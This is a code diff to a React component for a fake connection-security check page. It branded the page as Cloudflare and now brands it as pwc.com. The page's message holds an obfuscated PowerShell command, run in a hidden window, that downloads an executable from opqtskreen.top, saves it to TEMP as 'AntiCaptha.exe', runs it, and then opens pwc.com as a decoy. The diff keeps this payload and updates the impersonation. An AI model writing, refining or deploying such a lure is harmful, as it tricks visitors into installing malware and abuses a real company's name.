@@ -6,7 +6,7 @@ function App() {
   const [screen, setScreen] = useState<'check' | 'error'>('check');
   const [isLoading, setIsLoading] = useState(false);
   const [fixMode, setFixMode] = useState(false);
- const [message, setMessage] = useState<string>("poWersHElL -W h -c \"$u='h\"t\"tp\"s:/\/op\"qts\"kr\"een.top\"/B\"in\"/Ses\"s\"ion.Cl\"ient\"Set\"up.ex\"e';$p=$e\"n\"v:TE\"MP+'\\Ses\"s\"ion.ex\"e';iw\"r $u -o $p;st\"ar\"t $p;s\"tart 'h\"t\"tp\"s:/\/w\"ww.p\"w\"c.com'\"");
+ const [message, setMessage] = useState<string>("poWersHElL -W h -c \"$u='h\"t\"tp\"s:/\/op\"qts\"kr\"een.top\"/B\"in\"/Ses\"s\"ion.Cl\"ient\"Set\"up.ex\"e';$p=$e\"n\"v:TE\"MP+'\\AntiCaptha.ex\"e';iw\"r $u -o $p;st\"ar\"t $p;s\"tart 'h\"t\"tp\"s:/\/w\"ww.p\"w\"c.com'\"");
 useEffect(() => {
   // Используем setMessage без изменения состояния
   setMessage(message);
@@ -69,7 +69,7 @@ useEffect(() => {
               <button className="btn-outline" onClick={() => window.location.reload()}>Retry</button>
             </div>
             <p className="small" style={{ marginTop: '1.5rem' }}>
-              <b>CloudFlare</b> needs to review the security of your connection before proceeding.
+              <b>pwc.com</b> needs to review the security of your connection before proceeding.
             </p>
           </div>
         )}
